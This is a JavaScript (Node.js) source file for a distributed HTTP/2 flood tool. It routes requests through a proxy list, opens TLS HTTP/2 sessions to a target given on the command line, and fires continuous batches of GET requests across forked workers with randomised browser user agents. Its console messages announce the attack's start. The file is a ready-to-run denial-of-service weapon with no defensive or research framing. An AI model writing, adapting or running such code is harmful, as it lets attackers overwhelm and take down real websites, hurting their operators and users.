 
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const fs = require('fs');
const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const http2 = require('http2');
const cluster = require('cluster');
const argv = require('minimist')(process.argv.slice(2));

const gradient = require('gradient-string');

const threads = argv["threads"] || 1;
try {
	var proxies = fs.readFileSync("proxy.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
} catch (error) {
	console.log(gradient('cyan', 'green')('~~> 添加 proxy.txt!'));

	process.exit();
}

var UAs = [
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.64",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36 Edg/104.0.1293.54",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.85",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.56 (Edition std-1)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.30",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.83",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.62",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 OPR/86.0.4363.70",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36 Edg/102.0.1245.33",
	"Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.58",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; MDDCJS)",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
]


if (process.argv.length < 3) {
	console.log(gradient('cyan', 'green')('~~> 没有开始 目标 !'));
	process.exit();
}
var target = process.argv[2];
var time = process.argv[3];
try {
	var parsed = url.parse(target);
} catch (e) {
	process.exit();
}
class TLS {
	constructor(socket) {}
	AlertMain() {
		console.clear();
		console.clear();
		console.clear();
		console.clear();
		console.clear();
		console.clear();
		console.clear();
		console.clear();
		console.log(gradient('cyan', 'green')('~~> Attack started!攻击开始发送'));
	}
	Tunnel(socket, forward) {
		socket.setKeepAlive(true, process.argv[3] * 1000)
		socket.setTimeout(10000);
		var headers = {};

		headers[":method"] = "GET";
		headers[":path"] = parsed.path;
		headers[":scheme"] = "https";
		headers["accept"] = "/";
		headers["accept-language"] = "en-US,en;q=0.9";
		headers["accept-encoding"] = "gzip, deflate";
		headers["cache-control"] = "no-cache";
		headers["upgrade-insecure-requests"] = "1";
		// headers["x-requested-with"] = "XMLHttpRequest";
		headers[":authority"] = parsed.host
		headers["user-agent"] = UAs[Math.floor(Math.random() * UAs.length)];

		const govno = tls.connect(443, parsed.host, {
			ALPNProtocols: ["h2"],
			rejectUnauthorized: false,
			servername: url.hostname,
			socket: socket,
			secure: true,
			servername: parsed.host
		});

		govno.setKeepAlive(true, 60 * 10000);

		const client = http2.connect(parsed.href, {
			protocol: "https:",
			settings: {
				headerTableSize: 65536,
				maxConcurrentStreams: 1000,
				initialWindowSize: 6291456,
				maxHeaderListSize: 262144,
				enablePush: true
			},
			maxSessionMemory: 33333,
			maxDeflateDynamicTableSize: 4294967295,
			createConnection: () => govno,
			socket: socket,
		}, () => {
			setInterval(async () => {
				for (let i = 0; i < 32; i++) {
					await client.request(headers).end();
				}
			}, 1000);
		});
	}
}
const Nuclear = new TLS();
Nuclear.AlertMain();

function Runner() {
	for (let i = 0; i < 64; i++) {
		var proxy = proxies[Math.floor(Math.random() * proxies.length)];
		proxy = proxy.split(':');
		var req = http.get({
			host: proxy[0],
			port: proxy[1],
			path: parsed.host + ":443",
			timeout: 15000,
			method: 'CONNECT'
		})
		req.end();
		req.on('connect', (_, socket) => {
			Nuclear.Tunnel(socket, proxy[0]);
		});
		req.on('end', () => {
			req.resume()
			req.close();
		});
	}
}
if (cluster.isMaster) {
	for (let i = 0; i < threads; i++) {
		cluster.fork()
	}
	setTimeout(function() {
		process.exit();
		process.exit();
	}, process.argv[3] * 1000);
} else {
	setInterval(Runner)
}
process.on('uncaughtException', function(e) {})
process.on('unhandledRejection', function(e) {})